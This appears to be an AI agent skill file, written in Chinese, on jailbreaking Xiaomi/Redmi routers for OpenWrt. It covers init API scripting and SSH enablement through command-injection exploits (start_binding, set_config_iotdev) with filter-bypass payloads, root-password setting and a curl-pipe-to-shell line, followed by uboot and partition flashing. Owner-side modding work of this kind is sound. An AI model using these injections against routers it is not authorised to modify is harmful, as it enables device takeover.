---
name: xiaomi-auto-init-adaptation
description: 适配不同固件版本的小米/红米路由器自动初始化及 SSH 注入脚本（跨 newEncryptMode 兼容）
source: auto-skill
extracted_at: '2026-06-02T14:07:34.975Z'
---

# 小米路由器刷机前置脚本适配

当需要为不同固件版本的小米/红米路由器编写或适配 `auto_init.py` / `enable_ssh.py` 时，使用以下方法论。

## 流程概览

```
识别设备 → 探测 API 差异 → 分析加密 → 验证算法 → 编写/适配脚本 → SSH 注入
```

## 步骤详解

### 1. 识别设备特征

访问路由器的 `init_info` API 获取关键信息：

```bash
curl -s 'http://192.168.31.1/cgi-bin/luci/api/xqsystem/init_info'
```

重点关注字段：
- `inited`: 0=未初始化，1=已初始化
- `newEncryptMode`: 0=旧加密(SHA1)，1=新加密(SHA256)，**字段缺失时默认当作 0**
- `model`: 如 `xiaomi.router.rd03`（AX3000T），`xiaomi.router.r3600`（AX3600）
- `hardware`: 如 `RD03`，`R3600`
- `romversion`: 固件版本

> **注意**: `newEncryptMode` 字段可能完全不存在于 `init_info` 响应中（如 AX3600 固件 1.1.19）。此时默认当作 `newEncryptMode=0`（SHA1 旧加密），不要报错或中止。

### 2. 分析登录流（核心差异）

**newEncryptMode=0（旧版，如 AX5/RA67 / AX3600）:**
- 需要计算 nonce + SHA1 哈希密码
- URL: GET `/cgi-bin/luci/api/xqsystem/login?username=admin&logtype=2&nonce={nonce}&password={hash}&init=1&privacy=1`
- `privacy=1` 是可选但建议保留的参数

**newEncryptMode=1（新版，如 AX3000T/RD03）:**
- 初始化登录无需 nonce，直接明文密码
- URL: GET `/cgi-bin/luci/api/xqsystem/login?username=admin&logtype=2&password=admin&init=1`
- 普通登录（已初始化后）：POST 方式，application/x-www-form-urlencoded，带 nonce 和 SHA256 哈希

### 3. 分析加密算法

两种加密模式的核心差异在 **oldPwd** 和 **newPwd/newPwd256**：

| 参数 | newEncryptMode=0 | newEncryptMode=1 |
|------|-----------------|-----------------|
| nonce 格式 | `0__{ts}_{rand}` | `0__{ts}_{rand}`（实测用旧格式，非设备ID格式） |
| oldPwd 算法 | SHA1(nonce + SHA1(pwd+KEY)) | SHA256(nonce + SHA256(pwd+KEY)) |
| newPwd 算法 | SHA1-AES-CBC | SHA1-AES-CBC（兼容）+ SHA256-AES-CBC 两者都发 |

**验证算法的方法：**
1. 让用户通过浏览器手动执行一次初始化
2. 从浏览器开发者工具的 Network 面板捕获 POST 请求的 form data
3. 使用捕获的 nonce 和自己计算的哈希做比对验证

### 4. WAN 设置差异

| 模式 | 方法 | URL | 参数 |
|------|------|-----|------|
| 旧 (newEncryptMode=0) | POST | `/api/xqnetwork/set_wan_new` | `wanType=dhcp&autoset=0` |
| 新 (newEncryptMode=1) | POST | `/api/xqnetwork/set_wan_new` | `wanType=dhcp&autoset=1` |

> **注意**: 旧模式也是 POST，区别仅在于 `autoset` 值（0 vs 1）。不要错误地使用 GET。

### 5. set_router_normal 参数差异

**newEncryptMode=0（旧版，如 AX5 / AX3600）：**
- 仅 `newPwd`（SHA1-AES 加密），**不传 `newPwd256`**
- `bw160` 字段**因固件版本而异**（详见下方版本兼容性）
- 不传 `update=1`、`bsd=1`
- 传 `routerPwd`: 明文管理员密码
- `name` 与 `ssid` 传相同值

### 5a. bw160 字段版本兼容性

`bw160`（关闭160MHz带宽）字段的行为因固件版本不同：

| 固件版本范围 | bw160 行为 |
|-------------|-----------|
| 1.0.x（如AX3600 1.0.17） | **不允许**传 `bw160`，否则报错 `nonce 验证错误 (1582)` |
| 1.1.x+（如AX3600 1.1.19） | **需要**传 `bw160=false`（字符串 `"false"`） |

**检测与适配方法：**

```python
def get_firmware_version(router_ip: str) -> str:
    """获取固件版本号"""
    r = http_get(f"http://{router_ip}/cgi-bin/luci/api/xqsystem/init_info")
    return r.get('romversion', '')

def need_bw160(version: str) -> bool:
    """是否需要 bw160 字段（新固件 >= 1.1.x 需要）"""
    try:
        parts = version.split('.')
        major, minor = int(parts[0]), int(parts[1])
        return major >= 1 and minor >= 1
    except (ValueError, IndexError):
        return True  # 不确定时保守处理
```

使用方式：
```python
fw_ver = get_firmware_version(router_ip)
has_bw160 = need_bw160(fw_ver)
post_data = { ... }  # 基础字段
if has_bw160:
    post_data['bw160'] = 'false'
```

**newEncryptMode=1（新版，如 AX3000T）：**
- 需要 `newPwd` + `newPwd256` 两个字段（SHA1-AES 兼容 + SHA256-AES）
- 需要 `update=1`, `bw160=1`（注意是 `"1"` 不是 `"true"`）, `bsd=1`
- 需要 `routerPwd`: 明文管理员密码

**通用参数（两种模式都有）：**
- `ssid`, `password`, `name`, `locale`（`家`）, `encryption`（`mixed-psk`）
- `nonce`: `0__{ts}_{rand}` 格式
- `oldPwd`: 哈希值（SHA1 或 SHA256 取决于模式）
- `txpwr=1`

### 6. 可选步骤差异

| 步骤 | newEncryptMode=0（AX5/AX3600） | newEncryptMode=1（AX3000T） |
|------|-------------------------------|----------------------------|
| **vas_switch**（禁用自动更新） | 需要：`GET /api/misystem/vas_switch?info=auto_upgrade%3D0` | 不需要此步骤 |

### 7. 关键调试技巧

1. **502 Bad Gateway**:
   - **set_router_normal 时**: 路由器后端服务崩溃，通常是 oldPwd 算法不匹配或参数错误。恢复后重试。
   - **start_binding 注入时**: 这是**正常行为**！命令执行后后端进程会 crash，API 返回 502。只要验证执行结果（检查 iperf_test_thr 等副作用）确认注入成功即可。
2. **原密码不正确(code 1552)**: oldPwd 算法不对（SHA1 vs SHA256）
3. **密码不合法(code 1553)**: 新固件要求密码包含数字+字母+特殊字符。`12345678` 在新固件中可能被拒绝，改用 `Pass@1234` 或 `Admin@123`。
4. **nonce 验证错误(code 1582)**: 通常不是 nonce 格式问题，而是**前序步骤出错导致后端状态异常**。例如 WAN 设置步骤的 HTTP 方法或参数错误，会使后端拒绝后续 nonce/oldPwd 校验。优先排查 WAN 步骤的 method/params 是否正确。
5. **抓包验证**: 让用户手动操作一次，从浏览器 Network 面板获取完整 form data，用你的 Python 代码重现相同哈希值来验证算法
6. **xmir-patcher**: 参考 [openwrt-xiaomi/xmir-patcher](https://github.com/openwrt-xiaomi/xmir-patcher) 中的 `gateway.py` 的 `web_login()` 和 `xqhash()` 方法
7. **start_binding 注入通用 payload 格式**:
   ```
   key = "1234' -X \n<命令>\n logger -t X 'X"
   ```
   注入前**必须**先将所有 `;` 和 `|` 替换为 `\n`，因为 hackCheck 会过滤这些字符。是在构造 payload **前**替换，不是在 payload 内部替换。

## 双固件刷写（通用方法）

适用于拥有 `rootfs` + `rootfs_1` 双分区的小米路由器（如 AX3600, AX6/RA69），通过 SSH 写入备胎分区并切换启动标志。

### 分区特征

```
mtd12: rootfs     — 主固件分区（当前运行）
mtd13: rootfs_1   — 备份/备胎分区
```

路由器通过 nvram 标志决定从哪个分区启动：
- `flag_boot_rootfs=0` → 从 `rootfs` 启动
- `flag_boot_rootfs=1` → 从 `rootfs_1` 启动
- `flag_last_success` — 上次成功启动的分区标志

### 刷写流程

```python
# 1. 检测当前启动分区
ssh> nvram get flag_boot_rootfs  # 0=主, 1=备胎

# 2. 写入备胎分区
if flag_boot_rootfs == "0":
    target = "rootfs_1"   # mtd13
    new_flag = "1"
else:
    target = "rootfs"     # mtd12
    new_flag = "0"

ssh> mtd write /tmp/firmware.bin {target}
ssh> sync

# 3. 切换启动标志并重启
ssh> nvram set flag_boot_rootfs={new_flag}
ssh> nvram set flag_last_success={new_flag}
ssh> nvram commit
ssh> reboot
```

### Shell 脚本模板

```bash
#!/bin/bash
FW="${1:-firmware.bin}"
IP="192.168.31.1"
PASS="root"

# 上传 + MD5 校验
sshpass -p "$PASS" scp -O -oHostKeyAlgorithms=ssh-rsa "$FW" root@$IP:/tmp/
LOCAL_MD5=$(md5sum "$FW" | cut -d' ' -f1)
REMOTE_MD5=$(sshpass -p "$PASS" ssh -oHostKeyAlgorithms=ssh-rsa root@$IP 'md5sum /tmp/firmware.bin' | cut -d' ' -f1)
[ "$LOCAL_MD5" != "$REMOTE_MD5" ] && { echo "MD5 mismatch"; exit 1; }

# 确定备胎分区
CURRENT=$(sshpass -p "$PASS" ssh -oHostKeyAlgorithms=ssh-rsa root@$IP 'nvram get flag_boot_rootfs')
if [ "$CURRENT" = "0" ]; then
    TARGET="rootfs_1"; NEW_FLAG=1
else
    TARGET="rootfs"; NEW_FLAG=0
fi

# 写入 + 切标志 + 重启
sshpass -p "$PASS" ssh -oHostKeyAlgorithms=ssh-rsa root@$IP "mtd write /tmp/firmware.bin $TARGET && sync"
sshpass -p "$PASS" ssh -oHostKeyAlgorithms=ssh-rsa root@$IP \
  "nvram set flag_boot_rootfs=$NEW_FLAG && nvram set flag_last_success=$NEW_FLAG && nvram commit"
sshpass -p "$PASS" ssh -oHostKeyAlgorithms=ssh-rsa root@$IP 'reboot'
```

### 注意事项
- `mtd write` 命令可以直接用分区名（如 `rootfs_1`），无需写 `/dev/mtd13`
- 刷写前确保固件大小与 MTD 分区大小完全一致（通过 `stat -c %s` 确认）
- 刷写脚本要兼容 OpenWRT 过渡固件（IP 可能变为 `192.168.1.1`）

### 重要：刷 UBI 镜像必须用 `ubiformat`，不能用 `mtd write`

**`mtd write` 直接写 `.ubi` 文件会把 UBI 卷表写坏**，启动后内核 attach UBI 时只能识别出一个名为 "data" 的畸形卷，无法作为系统分区启动。

正确做法：

```bash
# ❌ 错误：会破坏 UBI 卷表
mtd write /tmp/openwrt.ubi rootfs_1

# ✅ 正确：ubiformat 正确处理 UBI 镜像
ubiformat /dev/mtd13 -y -f /tmp/openwrt.ubi
```

**原理：** `ubiformat` 会遍历 UBI 镜像中的所有 PEBS（物理擦除块），设置正确的擦除计数器，写入卷表头和数据。而 `mtd write` 只是盲写二进制数据到 flash，不会初始化 UBI 所需的元数据结构。

**验证写入是否正确：**

```bash
# 写入后附加 UBI 设备查看卷名
ubiattach -m 13
cat /sys/class/ubi/ubi*/name
# 正常 OpenWRT UBI 应显示: kernel, rootfs, rootfs_data
# 错误的 mtd write 会显示: data (只有一个卷)
```

## 过渡 OpenWRT 中设置 fw_setenv

刷写 MIBIB 和 uboot 前，需在过渡 OpenWRT 中通过 `fw_setenv` 设置 uboot 环境变量（等效于小米原厂的 `nvram set`），确保下次启动行为正确：

```bash
fw_setenv flag_last_success 0
fw_setenv flag_boot_rootfs 0
fw_setenv boot_wait on
```

**目的：** 为刷写自定义 MIBIB（分区表）和 uboot 做准备，让 uboot 标记下次从 mtd12 (rootfs) 启动。

**脚本模板：**
```bash
#!/bin/bash
set -e
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -o HostKeyAlgorithms=+ssh-rsa root@192.168.1.1 "
    fw_setenv flag_last_success 0
    fw_setenv flag_boot_rootfs 0
"
echo "标志已设置"
```

## 刷写 MIBIB + Uboot 到 Qualcomm 平台（AX3600）

适用于更换分区表和 bootloader 的场景。在过渡 OpenWRT 上通过 SSH 执行。

### 分区说明

| 分区 | MTD | 大小 | 说明 |
|------|-----|------|------|
| MIBIB | mtd1 | 1MB | 分区表（定义了所有 MTD 分区的布局） |
| APPSBL | mtd7 | 1MB | Uboot 本体 |

### 刷写流程

```bash
# 1. SCP 上传两个文件
sshpass -p '' scp -O -oHostKeyAlgorithms=+ssh-rsa \
    ax3600-mibib.bin ax3600-uboot.bin root@192.168.1.1:/tmp/

# 2. MD5 校验每个文件
ssh -oHostKeyAlgorithms=+ssh-rsa root@192.168.1.1 \
    'md5sum /tmp/ax3600-mibib.bin /tmp/ax3600-uboot.bin'

# 3. 刷入 MIBIB（分区表）
ssh -oHostKeyAlgorithms=+ssh-rsa root@192.168.1.1 "
    mtd erase /dev/mtd1
    mtd write /tmp/ax3600-mibib.bin /dev/mtd1
"

# 4. 刷入 Uboot
ssh -oHostKeyAlgorithms=+ssh-rsa root@192.168.1.1 "
    mtd erase /dev/mtd7
    mtd write /tmp/ax3600-uboot.bin /dev/mtd7
    sync
"
```

### Shell 脚本模板

```bash
#!/bin/bash
set -e
IP="192.168.1.1"
SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o HostKeyAlgorithms=+ssh-rsa"

# 上传 + MD5 验签
for f in ax3600-mibib.bin ax3600-uboot.bin; do
    sshpass -p '' scp -O $SSH_OPTS "$f" root@$IP:/tmp/
    local_md5=$(md5sum "$f" | cut -d' ' -f1)
    remote_md5=$(ssh $SSH_OPTS root@$IP "md5sum /tmp/$f" | cut -d' ' -f1)
    [ "$local_md5" != "$remote_md5" ] && { echo "$f MD5 mismatch"; exit 1; }
done

# 刷入
ssh $SSH_OPTS root@$IP "mtd erase /dev/mtd1; mtd write /tmp/ax3600-mibib.bin /dev/mtd1"
ssh $SSH_OPTS root@$IP "mtd erase /dev/mtd7; mtd write /tmp/ax3600-uboot.bin /dev/mtd7; sync"

echo "完成，请断电重启"
```

### 注意事项

- **过渡 OpenWRT 是 initramfs 系统**，重启后所有临时文件丢失，必须在上传操作全部完成后才断电
- MIBIB 和 uboot 必须匹配（来自同一套大分区方案），否则可能变砖
- 刷完后**必须断电重启**，仅 reboot 可能不够
- 断电重启后 uboot 启动，IP 变为 `192.168.1.1`，可通过浏览器访问

## Uboot_mod Web UI 固件上传

刷入自定义 uboot（如 pepe2k/u-boot_mod）后，路由器启动时会进入 uboot web 刷机页面。

### 识别

通过浏览器访问 `http://192.168.1.1/`，页面特征：
- 标题：`Firmware update`
- 来自：`pepe2k/u-boot_mod`（GitHub 开源项目）
- 版本号如：`uboot2.0 version:21.12.26`

### 上传接口

```html
<!-- uboot web 页面核心表单 -->
<form method="post" enctype="multipart/form-data">
  <input type="file" name="firmware">
  <input type="submit" value="Update firmware">
</form>
```

接口详情：
```
URL:     POST http://192.168.1.1/
Method:  POST
Type:    multipart/form-data
Field:   name="firmware" (文件上传字段)
```

### 命令行上传脚本

```bash
#!/bin/bash
# 通过 uboot web UI 上传固件
FW="${1}"
IP="192.168.1.1"
[ -z "$FW" ] || [ ! -f "$FW" ] && { echo "用法: $0 <固件文件>"; exit 1; }
curl -# -F "firmware=@$FW" "http://$IP/"
```

默认用浏览器访问 `http://192.168.1.1/` 选择文件上传亦可。上传后 uboot 自动刷写并重启。

## Qualcomm 平台 MTD 分区布局参考（AX3600）

```
mtd0:  0:SBL1       (1MB)    PBL/SBL
mtd1:  0:MIBIB      (1MB)    分区表
mtd2:  0:QSEE       (3MB)    TrustZone
mtd3:  0:DEVCFG     (512KB)  设备配置
mtd4:  0:RPM        (512KB)  Resource Power Manager
mtd5:  0:CDT        (512KB)  配置数据表
mtd6:  0:APPSBLENV  (512KB)  Uboot 环境变量
mtd7:  0:APPSBL     (1MB)    Uboot
mtd8:  0:ART        (512KB)  WiFi 校准数据
mtd9:  bdata        (512KB)  设备数据 (SN/MAC)
mtd10: crash        (512KB)  崩溃日志
mtd11: crash_syslog (512KB)  系统日志
mtd12: rootfs       (35.75MB) 主固件 (UBI: kernel + ubi_rootfs)
mtd13: rootfs_1     (35.75MB) 备份固件
mtd14: overlay      (31.5MB)  数据覆写 (UBI: data)
mtd15: rsvd0        (512KB)  保留
```

UBI 设备：
- `ubi0` 在 mtd12 上，含 2 个卷：`kernel` (4.1MB) + `ubi_rootfs` (21.7MB)
- `ubi1` 在 mtd14 上，含 1 个卷：`data` (24.4MB)

## 通过前端 JS 逆向 API 调用

当需要分析小米路由器 API 时，可直接从路由器的 Web 管理页面提取 JavaScript 文件进行分析。

### 方法

```bash
# 1. 获取入口 HTML 确定 JS 文件
curl -s 'http://192.168.31.1/init.html'
# → 找到 <script src=/static/js/init.{hash}.js>

# 2. 获取 manifest.js 找到 chunk 映射
curl -s 'http://192.168.31.1/static/js/manifest.{hash}.js'
# → 里面包含 webpackJsonp 的 chunk 映射表

# 3. 从 chunk 映射中找到目标页面组件
# 例如 /dhcp 路由对应 chunk 0
# 例如 /wireless 路由对应 chunk 2
# chunk 文件名: {0:{hash}, 2:{hash}, ...}

# 3. 获取目标 chunk 分析 API 调用
curl -s 'http://192.168.31.1/static/js/0.{hash}.js'
```

### 关键搜索模式

```bash
# 直接搜索 API 路径
curl -s 'chunk.js' | grep -oP '.{50}set_router_normal.{100}'

# 搜索加密函数
curl -s 'chunk.js' | grep -oP '.{50}oldPwd.{100}'
curl -s 'chunk.js' | grep -oP '.{50}newPwd.{100}'

# 查看数据字段
curl -s 'chunk.js' | grep -oP '.{50}nonce.{50}'

# 搜索 URL / 路由路径
curl -s 'chunk.js' | grep -oP '.{50}api/misystem.{100}'
```

### 重要：分析时关注的点

1. **nonce 生成方式** — 看 `nonceCreat` 函数的实现（`join("_")` 的数组元素顺序决定格式）
2. **加密算法** — 看 `oldPwd` 和 `newPwd` 函数的实现（SHA1 vs SHA256）
3. **请求顺序** — 看 `onSubmit` 或类似处理函数中的 promise 链（决定 API 调用顺序）
4. **数据字段** — 看 POST 到 `set_router_normal` 的所有表单字段（对比已知差异）

## 通用密码学常量

```python
KEY = "a2ffa5c9be07488bbb04a3a47d3c5f6a"
IV = "64175472480004614961023454661220"
FACTORY_PWD = "admin"
```

这些跨所有已知 Xiaomi/Redmi 路由器相同。

## 检查路由器状态

```bash
# 检测是否已初始化
curl -s 'http://192.168.31.1/cgi-bin/luci/api/xqsystem/init_info' | grep -o '"inited":[01]'
```

## SSH 开启（命令注入）

初始化完成后，需要开启 SSH 才能进行后续刷机操作。不同固件版本使用不同的漏洞。

> **另一种注入方式（AX6/AX3000等MediaTek平台）**: 通过辅助路由器模拟 mesh 控制器注入 SSH。这种方法完全不同于下面的 API 注入，需要独立的辅助路由/HTTP 服务器和 WiFi 配合。详见 [xiaomi-mesh-exploit](.qwen/skills/xiaomi-mesh-exploit/SKILL.md)。

### 通用方法：探测 hackCheck + 多漏洞依次尝试

参考 `xmir-patcher` 的 `connect.py` + `connect6.py`：

```python
# 1. 探测 hackCheck 类型
# hackCheck=1: 字符过滤后返回 ''（空字符串）
# hackCheck=2: 字符过滤后返回 nil（API 500 崩溃）
# hackCheck=3: 更严格的过滤

# 2. 依次测试多个漏洞直到找到可用的
exploits = [
    # start_binding — 用 \n 绕过 ; 过滤
    # arn_switch — 用 \n 绕过 ; 过滤
    # set_mac_filter — 通过 uci 命令验证
    # datacenter7 — 用 # 注释绕过
]

# 3. 验证方式：尝试修改 uci 值再读回
test_val = 82000011  # 测一个不常见的数字
# 注入: uci set diag.config.iperf_test_thr={test_val} ; uci commit diag
# 验证: GET /api/xqnetwork/diag_get_paras → 检查 iperf_test_thr
```

### 方案 A：start_binding 漏洞（AX3000T 1.0.64）

适用于 hackCheck=2（AX3000T RD03 固件 1.0.64），用换行符 `\n` 绕过 `;` 过滤：

```python
stok = login(router_ip, admin_pwd)

# 替换所有 ; 为 \n
cmds = "\n".join([
    r"sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear",
    r"nvram set ssh_en=1",
    r"nvram set boot_wait=on",
    r"nvram commit",
    r"echo -e 'root\nroot' > /tmp/psw.txt",
    r"passwd root < /tmp/psw.txt",
    r"/etc/init.d/dropbear enable",
    r"/etc/init.d/dropbear restart",
])

key = "1234' -X \n" + cmds + "\n logger -t X 'X"
params = urllib.parse.urlencode({'uid': '1234', 'key': key})
url = f"http://192.168.31.1/cgi-bin/luci/;stok={stok}/api/xqsystem/start_binding?{params}"
```

**特点：**
- 无需重启，SSH 秒级就绪
- SSH 用户名 `root`，密码 `root`
- 路由器不支持 ssh-rsa 以外的 host key 算法 → 连接时需加 `-oHostKeyAlgorithms=+ssh-rsa`

### 方案 B：set_config_iotdev 漏洞（AX5 旧固件）

适用于更老固件，通过 `ssid` 参数注入：

```python
cmd = f"curl http://local-ip/unlock_ssh.sh | ash"
ssid = "-h\n" + cmd + "\n"
# POST /api/misystem/set_config_iotdev 带 ssid、bssid、user_id 参数
```

### 方案 C：set_config_iotdev 漏洞（AX3600 1.0.17 Qualcomm 平台）

适用于 AX3600 (R3600) 固件 1.0.17 等基于 Qualcomm IPQ8071A 平台的旧固件。

与 AX3000T 的关键区别：
- 注入 API：`set_config_iotdev`（而非 `start_binding`）
- 命令分隔符：**`;`**（分号，不经 hackCheck 过滤，直接可用）
- 无需重启：注入后直接 `dropbear restart`，SSH 秒级就绪

```python
stok = login(router_ip, admin_pwd)  # SHA1 GET 登录，init=0

def inject(ip, stok, cmd):
    ssid = "-h;" + cmd + ";"
    params = urllib.parse.urlencode({
        'bssid': 'Xiaomi',
        'user_id': 'longdike',
        'ssid': ssid,
    })
    url = f"http://{ip}/cgi-bin/luci/;stok={stok}/api/misystem/set_config_iotdev?{params}"
    return json.loads(urllib.request.urlopen(url, timeout=15).read())

# 4 条注入命令（完整 SSH 开启流程）
inject(ip, stok, "nvram set ssh_en=1; nvram commit")                      # 1. nvram 开启 SSH
inject(ip, stok, "sed -i 's/channel=.*/channel=\"debug\"/g' /etc/init.d/dropbear")  # 2. 修改 dropbear
inject(ip, stok, 'echo -e "root\\nroot" > /tmp/psw.txt; passwd root < /tmp/psw.txt') # 3. 设 root 密码
inject(ip, stok, "/etc/init.d/dropbear restart")                           # 4. 重启 dropbear
```

**特点：**
- 使用 `-h;` 前缀注入（而不是 `-h\n`）
- `;` 作为命令分隔符（不需替换为 `\n` — 不同于 AX3000T 的 hackCheck=2）
- 4 个注入步骤完成后 SSH 立即就绪（无需重启路由器）
- SSH 用户名 `root`，密码 `root`
- SSH host key 算法：`ssh-rsa`
- **bssid/user_id 参数值**: `bssid=Xiaomi&user_id=longdike`（AX3600 实测值，与 AX5 的 `gallifrey`/`doctor` 不同）

### 完整 nvram 设置（Qualcomm 平台 AX3600）

在注入 SSH 前，建议一次性设置全部 nvram 标志（合并到第一条注入命令中）：

```bash
nvram set flag_last_success=0    # 标记上次成功启动分区
nvram set flag_boot_rootfs=0     # 从 rootfs (mtd12) 启动
nvram set boot_wait=on           # 启动等待（uboot 阶段有用）
nvram set uart_en=1              # 开启 UART 串口
nvram set telnet_en=1            # 开启 telnet
nvram set ssh_en=1               # 开启 SSH
nvram commit                     # 提交保存
```

这些标志中 `flag_last_success` 和 `flag_boot_rootfs` 与双固件切换直接相关，决定下次启动从哪个分区引导。`boot_wait` 让 uboot 在启动时等待用户干预（进入 uboot web UI 或 TFTP 恢复模式）。

### 方案 D：xmir-patcher 的漏洞探测

参考 `connect6.py` 的系统化漏洞探测方式：

1. **exploit_1** — `API/misystem/arn_switch`（用 `\n` 替换 `;`）
2. **exploit_2** — `API/xqsystem/start_binding`（用 `\n` 替换 `;`，AX3000T RD03 通过此漏洞检测）
3. **exploit_3** — `API/xqsystem/set_mac_filter`（通过 `name` 参数注入）
4. **exploit_4** — `API/xqdatacenter/request`（通过 `payload` 参数注入）

探测方式：每种漏洞尝试执行 `uci set diag.config.iperf_test_thr={test_val}`，然后通过 `diag_get_paras` 读回验证。

### SSH 注入命令链

无论用哪种漏洞，最终执行的命令相同：

```bash
sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear    # 绕过 dropbear release 检查
nvram set ssh_en=1                                     # 开启 SSH
nvram set boot_wait=on                                 # 启动等待
nvram commit                                           # 保存 nvram
echo -e 'root\nroot' > /tmp/psw.txt                   # 准备密码
passwd root < /tmp/psw.txt                             # 设置 root 密码
/etc/init.d/dropbear enable                            # 启用 dropbear
/etc/init.d/dropbear restart                           # 重启 SSH 服务
```

**注意：** 不同 hackCheck 版本需要不同的命令分隔符：
- hackCheck=0（无过滤）：`;` 分隔命令
- hackCheck=1（返回空字符串）：需用 `\n` + 额外处理
- hackCheck=2（返回 nil）：必须用 `\n` 替换所有 `;`

### SSH 连接

路由器 SSH 只支持旧版 `ssh-rsa` host key 算法，需额外参数：

```bash
sshpass -p 'root' ssh -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -oHostKeyAlgorithms=+ssh-rsa \
  root@192.168.31.1
```

## 刷 uboot（SSH 后）

SSH 就绪后，刷写自定义 uboot 到 `mtd5 (FIP)`：

```bash
# 1. SCP 上传
sshpass -p 'root' scp -O -oHostKeyAlgorithms=ssh-rsa uboot.fip root@192.168.31.1:/tmp/

# 2. MD5 校验
sshpass -p 'root' ssh -oHostKeyAlgorithms=ssh-rsa root@192.168.31.1 'md5sum /tmp/uboot.fip'

# 3. mtd write 刷入
sshpass -p 'root' ssh -oHostKeyAlgorithms=ssh-rsa root@192.168.31.1 \
  'mtd write /tmp/uboot.fip /dev/mtd5 && sync'

# 4. 重启
sshpass -p 'root' ssh -oHostKeyAlgorithms=ssh-rsa root@192.168.31.1 'reboot'
```

重启后电脑设静态 IP `192.168.1.10`，访问 `http://192.168.1.1` 进入 uboot web 刷机界面。

## TFTP 服务器（uboot 刷机辅助）

uboot 启动后可通过 TFTP 获取固件。需要一个简单的 TFTP 服务器：

```bash
# 启动（需 root 权限绑定端口 69）
sudo python3 tftpd.py /path/to/files/

# uboot 端获取文件
#   tftp 0x46000000 firmware.ubi
#   bootm 0x46000000
```

**特点：**
- 只读模式，只响应读请求（RRQ）
- 支持 `octet`（二进制）和 `netascii` 模式
- 文件传输成功后**自动退出**，无需手动终止
- 防止路径穿越（仅取 basename）
- 传输失败（文件不存在等）也会退出

**内部实现：**
- 监听 UDP 69 端口
- 收到 RRQ 后分配临时端口传输
- 每块 512 字节，块编号从 1 开始
- 文件大小为 512 的倍数时，发送一个 0 字节空块作为结束标记
- 空块超时视为客户端已收完（某些客户端在收完数据后提前关闭）

## 进入 OpenWrt 后刷写 sysupgrade（ubootmod 模式）

uboot 启动 initramfs 后，可通过 sftp/scp 上传 sysupgrade 固件并刷写：

```bash
# 上传 → MD5 校验 → sysupgrade -F 强制刷写
./sysupgrade.sh firmware-sysupgrade.bin
./sysupgrade.sh --ip 192.168.1.1 firmware.bin
./sysupgrade.sh --pwd '' firmware.bin   # 免密登录（默认）
```

**注意：**
- 默认 IP 是 `192.168.1.1`，免密登录（OpenWrt 空密码时 SSH 可直接登录）
- 如果不开 `--pwd`，脚本直接用 `ssh`/`scp` 而非 `sshpass`
- SSH host key 算法自动协商（OpenWrt 使用 ed25519/ecdsa，与小米原厂固件的 ssh-rsa 不同）

### 固件兼容性检查失败的处理

如果 `sysupgrade -F` 因 board 不匹配失败（如固件支持 `xiaomi,mi-router-ax3000t` 但系统是 `xiaomi,mi-router-ax3000t-ubootmod`），可尝试直接用 `mtd write` 暴力写入：

```bash
mtd write /tmp/firmware.bin firmware
reboot
```

**需要注意的是：** ubootmod 分区布局下，`firmware` 分区（通常是 mtd8: ubi 或类似）可能不叫这个名字。先 `cat /proc/mtd` 确认分区名再写。
